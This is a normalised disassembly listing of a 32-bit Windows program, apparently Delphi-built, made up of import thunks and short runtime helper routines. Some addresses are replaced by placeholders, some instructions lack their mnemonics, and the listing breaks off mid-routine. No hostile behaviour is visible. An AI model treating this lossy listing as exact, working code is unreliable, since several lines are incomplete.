jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_4012a4
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ __import_lookup_table_0(kernel32:GetStartupInfoA) ]
sub_4012c4
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012e4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_401304
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_401334
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401344
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401390
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_4013a0
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401aea
jmp sub_4038f0
sub_401af1
mov al [ rw-data ]
pop ebp
retn
sub_401bce
jmp sub_4038f0
sub_401c9c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_4022b0
retn
sub_40229c
jmp sub_4038f0
sub_402442
jmp sub_4038f0
sub_4026e1
jmp sub_4038f0
sub_4027a4
call sub_405e88
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405e88
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027f8
mov [ rw-data ] edx
call sub_403ed4
sub_40285c
push eax
push edx
push ecx
call sub_405e88
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402850
retn
sub_402878
retn
sub_4028cc
retn
sub_4028d0
push ebx
call sub_405e88
mov ebx [ eax + 0x4 ]
call sub_405e88
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_40293c
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_40294c
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402a0c
mov edx [ eax + 0x1c ]
call sub_4029c4
retn
sub_402c74
mov ecx 0xff
call sub_402c80
retn
sub_402ca4
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402cc0
jmp sub_402cc0
sub_402cbd
retn
sub_40304d
jmp sub_4038f0
sub_4030a0
fninit
fwait
fldcw [ rw-data ]
retn
sub_403100
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_40310c
push ebx
mov ebx eax
mov eax ebx
call sub_40313c
call sub_4026f4
mov edx eax
mov eax ebx
call sub_403180
pop ebx
retn
sub_403128
push ebx
mov ebx eax
mov eax ebx
call sub_4031d8
mov eax ebx
call sub_402714
pop ebx
retn
sub_40313c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403164
call sub_403528
test dl dl
jle r-xdata
retn
call sub_403510
sub_403224
retn
sub_4032ac
jmp sub_4038f0
sub_4032b3
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4033a4
mov eax 0x8000ffff
retn
sub_4033ac
retn
sub_4033b0
retn
sub_4033b4
retn
sub_4034e9
jmp sub_40363c
sub_4034ee
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403950
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403510
sub_403510
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403518
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403528
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403538
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403600
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_40361c
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_4039e9
retn
sub_403b2c
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403bba
jmp sub_40363c
sub_403c1a
jmp sub_40363c
sub_403c34
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403b2c
mov [ rw-data ] 0x0
call sub_403bd4
retn
sub_403d6d
retn
sub_403ecf
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403ed4
mov [ rw-data ] eax
call sub_403dfc
sub_404110
retn
sub_40414c
retn
sub_40415a
retn
sub_404173
retn
sub_404184
retn
sub_40426b
retn
sub_40439c
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_4043b8#2
jmp sub_4043b8
sub_404401
retn
j_sub_4043b8
jmp sub_4043b8
sub_404409
retn
sub_40444b
retn
sub_4045a4
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402850
sub_4045bc
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404714
retn
sub_404726
retn
sub_404728
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404950
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402850
call [ rw-data ]
retn
sub_404a54
mov ecx 0x1
jmp sub_404968
sub_404a5e
retn
sub_404a60
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402850
call [ rw-data ]
retn
sub_404c86
retn
sub_404c88
mov al 0x11
jmp sub_402850
sub_404cb3
retn
sub_404ef4
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404b94
pop ebp
retn 0x4
j_sub_404968
jmp sub_404968
sub_404f09
retn
sub_404f0c
call sub_4050ac
retn
sub_405138
call sub_405110
retn
sub_405481
jmp sub_4038f0
sub_4055ec
call sub_4055fc
retn
sub_4055f4
call sub_40561c
retn
sub_4055fc
push ebx
mov ebx eax
mov eax 0x8
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4056b7
jmp sub_40363c
sub_4056d8
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_40574c
jmp sub_4038f0
sub_405753
pop ecx
pop ebp
retn
sub_4057cc
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_4057d8
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_4057e4
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402850
sub_4057f4
call sub_40310c
mov [ eax + 0x4 ] 0x1
retn
sub_40582c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_405b1b
jmp sub_4038f0
sub_405b22
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405bbf
jmp sub_4038f0
sub_405bc6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c0f
jmp sub_4038f0
sub_405c16
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405cda
jmp sub_4038f0
sub_405ce1
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405d32
jmp sub_4038f0
sub_405d39
pop ebp
retn
sub_405e10
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_405e30
push eax
push 0x40
call LocalAlloc
retn
sub_405e3c
mov eax 0x10
retn
sub_405ec8
mov eax rw-data
call sub_4056d8
retn
sub_405f3d
jmp sub_4038f0
sub_405f44
pop ebp
retn
sub_405f48
sub [ rw-data ] 0x1
retn
sub_405f50
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405f6c
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405f74
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_405ff9
jmp sub_4038f0
sub_406000
pop ebp
retn
sub_406004
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ __import_lookup_table_6(kernel32:CreateFileA) ]
CreateThread
jmp [ CreateThread@IAT ]
FindResourceA
jmp [ FindResourceA@IAT ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetProfileStringA
jmp [ __import_lookup_table_6(kernel32:GetProfileStringA) ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ GetSystemInfo@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ GetVersionExA@IAT ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_4062c0
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcmpA
jmp [ __import_lookup_table_6(kernel32:lstrcmpA) ]
lstrcpyA
jmp [ __import_lookup_table_6(kernel32:lstrcpyA) ]
GetFileVersionInfoA
jmp [ GetFileVersionInfoA@IAT ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CreateBitmap
jmp [ __import_lookup_table_8(gdi32:CreateBitmap) ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePen
jmp [ CreatePen@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
Ellipse
jmp [ Ellipse@IAT ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ GetDIBColorTable@IAT ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetTextMetricsA
jmp [ GetTextMetricsA@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ __import_lookup_table_8(gdi32:LineTo) ]
MaskBlt
jmp [ __import_lookup_table_8(gdi32:MaskBlt) ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ Rectangle@IAT ]
RoundRect
jmp [ RoundRect@IAT ]
SelectClipRgn
jmp [ SelectClipRgn@IAT ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:SetDIBColorTable) ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ __import_lookup_table_8(gdi32:SetROP2) ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:SetWindowOrgEx) ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ __import_lookup_table_9(user32:BeginDeferWindowPos) ]
BeginPaint
jmp [ BeginPaint@IAT ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ __import_lookup_table_9(user32:CallNextHookEx) ]
CallWindowProcA
jmp [ CallWindowProcA@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ __import_lookup_table_9(user32:CharToOemA) ]
CheckMenuItem
jmp [ CheckMenuItem@IAT ]
ClientToScreen
jmp [ ClientToScreen@IAT ]
CreateIcon
jmp [ CreateIcon@IAT ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DeferWindowPos
jmp [ __import_lookup_table_9(user32:DeferWindowPos) ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ __import_lookup_table_9(user32:DestroyMenu) ]
DestroyWindow
jmp [ __import_lookup_table_9(user32:DestroyWindow) ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFocusRect
jmp [ __import_lookup_table_9(user32:DrawFocusRect) ]
DrawIcon
jmp [ DrawIcon@IAT ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ DrawMenuBar@IAT ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndDeferWindowPos
jmp [ EndDeferWindowPos@IAT ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ __import_lookup_table_9(user32:EnumThreadWindows) ]
EnumWindows
jmp [ EnumWindows@IAT ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ __import_lookup_table_9(user32:FindWindowA) ]
GetClassNameA
jmp [ __import_lookup_table_9(user32:GetClassNameA) ]
GetClientRect
jmp [ __import_lookup_table_9(user32:GetClientRect) ]
GetCursor
jmp [ __import_lookup_table_9(user32:GetCursor) ]
GetDC
jmp [ __import_lookup_table_9(user32:GetDC) ]
GetDCEx
jmp [ GetDCEx@IAT ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ GetKeyNameTextA@IAT ]
GetKeyboardLayout
jmp [ GetKeyboardLayout@IAT ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ __import_lookup_table_9(user32:GetKeyboardState) ]
GetLastActivePopup
jmp [ __import_lookup_table_9(user32:GetLastActivePopup) ]
GetMenu
jmp [ __import_lookup_table_9(user32:GetMenu) ]
GetMenuItemID
jmp [ __import_lookup_table_9(user32:GetMenuItemID) ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ GetMenuStringA@IAT ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ __import_lookup_table_9(user32:GetPropA) ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ __import_lookup_table_9(user32:GetTopWindow) ]
GetWindowDC
jmp [ __import_lookup_table_9(user32:GetWindowDC) ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ GetWindowRect@IAT ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ __import_lookup_table_9(user32:IsDialogMessageA) ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ __import_lookup_table_9(user32:IsWindowEnabled) ]
IsZoomed
jmp [ IsZoomed@IAT ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ LoadBitmapA@IAT ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ __import_lookup_table_9(user32:LoadStringA) ]
MapVirtualKeyA
jmp [ __import_lookup_table_9(user32:MapVirtualKeyA) ]
MessageBoxA
jmp [ __import_lookup_table_9(user32:MessageBoxA) ]
OemToCharA
jmp [ __import_lookup_table_9(user32:OemToCharA) ]
PostQuitMessage
jmp [ PostQuitMessage@IAT ]
PtInRect
jmp [ PtInRect@IAT ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ __import_lookup_table_9(user32:ReleaseCapture) ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ __import_lookup_table_9(user32:RemoveMenu) ]
ScrollWindow
jmp [ __import_lookup_table_9(user32:ScrollWindow) ]
SetActiveWindow
jmp [ __import_lookup_table_9(user32:SetActiveWindow) ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ SetMenuItemInfoA@IAT ]
SetParent
jmp [ SetParent@IAT ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ __import_lookup_table_9(user32:SetWindowPlacement) ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ __import_lookup_table_9(user32:SetWindowsHookExA) ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ ShowScrollBar@IAT ]
TrackPopupMenu
jmp [ TrackPopupMenu@IAT ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ __import_lookup_table_9(user32:TranslateMessage) ]
UnhookWindowsHookEx
jmp [ __import_lookup_table_9(user32:UnhookWindowsHookEx) ]
UnregisterClassA
jmp [ __import_lookup_table_9(user32:UnregisterClassA) ]
UpdateWindow
jmp [ __import_lookup_table_9(user32:UpdateWindow) ]
ValidateRect
jmp [ ValidateRect@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406a44
call GetTickCount
retn
sub_406a4c
xor eax eax
retn
sub_406a50
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406a60
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406a7c
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406a90
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406ac8
call sub_406a38
retn
sub_406ad0
call sub_406a38
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406cad
jmp sub_4038f0
sub_406cb4
pop ebp
retn
sub_406cb8
sub [ rw-data ] 0x1
retn
sub_406ce5
jmp sub_4038f0
sub_406cec
pop ebp
retn
sub_406cf0
sub [ rw-data ] 0x1
retn
sub_40700d
jmp sub_4038f0
sub_407014
pop ebp
retn
sub_407018
sub [ rw-data ] 0x1
retn
sub_407ad5
add eax 0xffffffd4
jmp sub_40cf84
sub_407add
add eax 0xffffffd4
jmp sub_40ce2c
sub_407ae5
add eax 0xffffffd4
jmp sub_40cec8
sub_407af7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_40582c
sub_407b01
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405840
sub_407bd8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
pop ebx
retn
sub_407e48
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_407e10
test eax eax
sete al
pop esi
pop ebx
retn
sub_408380
call sub_40835c
retn
sub_408418
push eax
call CloseHandle
retn
sub_4085a0
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_4085b4
push esi
mov esi eax
xchg edx eax
call sub_4028f0
mov eax esi
pop esi
retn
sub_4087a0
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026f4
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_4087b4
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_4087ec
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_402714
sub_408854
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402850
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_408878
push ebx
mov ebx eax
mov eax ebx
call sub_403eec
pop ebx
retn
sub_408bdb
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403eec
pop eax
pop ebx
retn
sub_408e93
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_408fee
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_40934b
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_40934b
sub_409408
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043ac
mov edx esi
xor ecx ecx
call sub_409294
pop esi
pop ebx
retn
sub_40947c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4043ac
mov edx esi
mov cl 0x1
call sub_409294
pop esi
pop ebx
retn
sub_409cba
jmp sub_4038f0
sub_409cc1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409db2
jmp sub_4038f0
sub_409db9
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a55d
jmp sub_4038f0
sub_40a564
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a604
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a590
pop ebp
retn 0x8
sub_40a749
jmp sub_4038f0
sub_40a750
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40abf3
jmp sub_4038f0
sub_40abfa
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b113
jmp sub_4038f0
sub_40b11a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b1c5
jmp sub_4038f0
sub_40b1cc
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b26f
jmp sub_4038f0
sub_40b276
pop esi
pop ecx
pop ebp
retn
sub_40b452
jmp sub_4038f0
sub_40b459
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b4b0
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b7a2
jmp sub_4038f0
sub_40b870
jmp sub_4038f0
sub_40b898
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403128
sub_40ba34
jmp sub_4038f0
sub_40ba3b
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40ba44
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403928
sub_40ba51
retn
sub_40ba54
push ebp
mov ebp esp
call sub_40b998
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40ba44
pop ebp
retn 0x4
sub_40ba70
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b7c8
call sub_403928
retn
sub_40bb08
push ebx
mov ebx eax
mov eax ebx
call sub_40ba88
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bcdb
jmp sub_4038f0
sub_40bce2
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bda7
jmp sub_4038f0
sub_40bdae
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bdb8
call sub_40b644
mov eax 0x1
call sub_403ed4
sub_40bf3c
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40c015
jmp sub_4038f0
sub_40c032
jmp sub_4038f0
sub_40c039
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c0e4
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
